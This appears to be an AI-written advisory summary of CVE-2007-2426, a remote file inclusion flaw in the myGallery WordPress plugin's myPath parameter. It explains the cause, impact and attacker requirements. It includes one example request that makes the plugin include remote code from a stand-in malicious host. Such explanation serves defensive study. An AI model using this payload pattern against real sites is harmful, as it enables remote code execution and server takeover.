Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2007-2426:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a lack of proper input sanitization in the `myPath` parameter within the `mygallerybrowser.php` file of the myGallery WordPress plugin. The plugin directly uses this parameter to include another file, without proper validation.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The core issue is the ability to include remote files. The `myPath` parameter, passed through either GET or POST, is directly used in a `require_once` statement. This makes it possible for an attacker to inject a URL pointing to a malicious file hosted on a remote server.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file, an attacker can execute arbitrary code on the server running the vulnerable WordPress installation. This could lead to complete compromise of the website and server.
*   **Data Theft/Manipulation:** Successful exploitation allows attackers to potentially access sensitive data, modify the website's content, or use the compromised server as a launchpad for further attacks.

**Attack Vectors:**

*   **HTTP GET/POST Requests:** The `myPath` parameter can be manipulated via either GET or POST requests to the `mygallerybrowser.php` script.
    *   Example: `[Path_myGallery]/mygallery/myfunctions/mygallerybrowser.php?myPath=http://malicious.server/evil.txt`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
*   **Knowledge of the Vulnerable Plugin:**  The attacker needs to know the vulnerable plugin (`myGallery`) is installed and where the vulnerable script resides (`mygallerybrowser.php`).
*   **Ability to Host a Malicious File:** The attacker must have a web server hosting the malicious code they intend to include via the `myPath` parameter.

**Additional Notes:**

*   The exploit details mention `myGallery 1.2.1`, while the CVE is for `mygallery 1.4b4`.
*   The provided exploit code also highlights how the `myPath` variable is used in both `if` and `else` blocks, regardless of if the request is GET or POST.

In summary, CVE-2007-2426 is a Remote File Inclusion vulnerability present in the myGallery WordPress plugin, caused by unsanitized input passed through the `myPath` parameter. This vulnerability allows attackers to include remote files, potentially leading to arbitrary code execution and complete compromise of the affected server.
